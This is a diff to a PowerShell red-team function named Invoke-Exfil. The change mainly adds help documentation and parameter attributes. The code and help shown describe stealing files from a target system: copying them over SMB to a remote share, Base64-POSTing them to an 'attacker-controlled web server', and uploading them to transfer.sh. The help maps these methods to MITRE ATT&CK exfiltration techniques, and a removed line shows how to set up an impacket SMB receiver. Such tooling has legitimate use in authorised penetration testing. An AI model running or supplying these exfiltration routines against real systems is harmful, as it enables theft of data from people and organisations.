@@ -1,14 +1,55 @@
 function Invoke-Exfil {
+<#
+                                          
+.SYNOPSIS
+	Methods to allow for moving files off of a target system to a remote system.
+
+.PARAMETER Help
+	Shows detailed help for each function.
+
+.PARAMETER List
+	Shows summary list of available functions.
+	
+.PARAMETER SmbExfil
+	Copies a local file over SMB to a remote SMB Server/Share.
+
+.PARAMETER RestExfil
+	Uses PowerShell's "Invoke-RestMethod" "POST" to Base64 encode and send a file to an attacker-controlled web server.
+
+.PARAMETER TransferShExfil
+	Uploads a file to the https://transfer.sh file upload service. A URL to the file will be returned and is valid for 14 days. "Invoke-WebRequest" and PUT is utilized for this function.
+	
+.EXAMPLE
+	PS> Invoke-Exfil -SmbExfil -LocalFile C:\temp\data.txt -SmbIp n.n.n.n
+	
+.EXAMPLE
+	Invoke-Exfil -RestExfil -LocalFile C:\file -Url https://srv/exfil
+	
+.EXAMPLE
+	Invoke-Exfil -TransferShExfil -LocalFile C:\file
+	
+.NOTES
+	Author: Fabrizio Siciliano (@0rbz_)
+
+#>
+
 [CmdletBinding()]
 param (
+	[Parameter(Position=1)]
 	[Switch]$Help,
 	[switch]$List,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$SmbExfil,
 	[String]$SmbIp,
 	[String]$LocalFile,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$RestExfil,
 	[String]$LocalFile2=[String]$Localfile,
 	[String]$Url,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$TransferShExfil,
 	[String]$LocalFile3=[String]$LocalFIle
 )
@@ -45,13 +86,10 @@ $UA = ($UAArray[(get-random -Maximum ([array]$UAArray).count)])
  |-----------------------------------------------------------------------------|
  | -SmbExfil [-LocalFile] local_file [-SmbIp] smb_ip                           |
  |-----------------------------------------------------------------------------|
-                                                                                
-   [*] Description: Copies a local file over SMB to a remote SMB                
-       Listener.                                                                
-                                                                                
-   [*] Usage: Invoke-Exfil -SmbExfil -LocalFile C:\temp\data.txt -SmbIp n.n.n.n 
-   [*] Use impacket-smbserver on remote:                                                  
-       impacket-smbserver data /tmp/data -smb2support 
+
+   [*] Description: Copies a local file over SMB to a remote SMB Server/Share.
+
+   [*] Usage: Invoke-Exfil -SmbExfil -LocalFile C:\temp\data.txt -SmbIp n.n.n.n
 	   
    [*] Mitre ATT&CK Ref: T1020 (Automated Exfiltration)
    [*] Mitre ATT&CK Ref: T1048 (Exfiltration over Alternative Protocol)   
@@ -60,8 +98,8 @@ $UA = ($UAArray[(get-random -Maximum ([array]$UAArray).count)])
  | -RestExfil [-LocalFile] local_file [-Url] remote_server                     |
  |-----------------------------------------------------------------------------|
  
-   [*] Description: Uses PowerShell's "Invoke-RestMethod" "POST" to encode and 
-       send a file to an attacker-controlled web server.
+   [*] Description: Uses PowerShell's "Invoke-RestMethod" "POST" to Base64 encode 
+       and send a file to an attacker-controlled web server.
 	
    [*] Usage: Invoke-Exfil -RestExfil -LocalFile C:\file -Url https://srv/exfil
    
@@ -98,12 +136,14 @@ $UA = ($UAArray[(get-random -Maximum ([array]$UAArray).count)])
 	}
 
 	elseif ($SmbExfil -and $SmbIp -and $LocalFile) {
+	
 		(Copy-Item -Path $LocalFile -Destination \\$SmbIp\data\)
+	
 	}
 	elseif ($RestExfil -and $LocalFile -and $Url) {
 	
 		if ($PSVersionTable.PSVersion.Major -eq "2") {
-			Write " [!] This function requires PowerShell version greater than 2.0."
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
 			return
 		}
 		else {
@@ -118,8 +158,9 @@ $UA = ($UAArray[(get-random -Maximum ([array]$UAArray).count)])
 		}
 	}
 	elseif ($TransferShExfil -and $LocalFIle) {
+	
 		if ($PSVersionTable.PSVersion.Major -eq "2") {
-			Write " [!] This function requires PowerShell version greater than 2.0."
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
 			return
 		}
 		else {
